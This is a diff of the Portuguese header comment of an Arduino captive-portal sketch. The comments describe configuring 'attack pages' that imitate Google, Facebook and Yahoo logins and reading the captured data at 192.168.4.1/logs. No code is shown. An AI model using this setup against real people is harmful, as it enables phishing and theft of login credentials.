@@ -1,6 +1,7 @@
 /*
  * Criador Oficial Da Versão Brasileira Antonio Caleb.
- * Criador Oficial Da Versão Inglesa OxMarco (Criador Mega Oficial Da Script).
+ * Criador Oficial Da Versão Inglesa OxMarco (Dono Da Script).
+ * Apos Ligar Irá Aparecer Sua Internet. Apos Conectar Abrir Seu Navegador Coloque Na Aba De Pesquisa Esse Endereço IP ("192.168.4.1/logs") Sem Aspas.
  * (Apenas Para Uso Educacional)
  * Para Configurar As Paginas De Ataque, Fazer Uma Pasta Colocando O CalebCaptivePortal.Ino E Os Outros Com Nome Google.h Facebook.h Yahoo.h.
  * Apos Fazer A Pasta Abrir O Arquivo.Ino Já Pode Configrar As Paginas De Ataque.
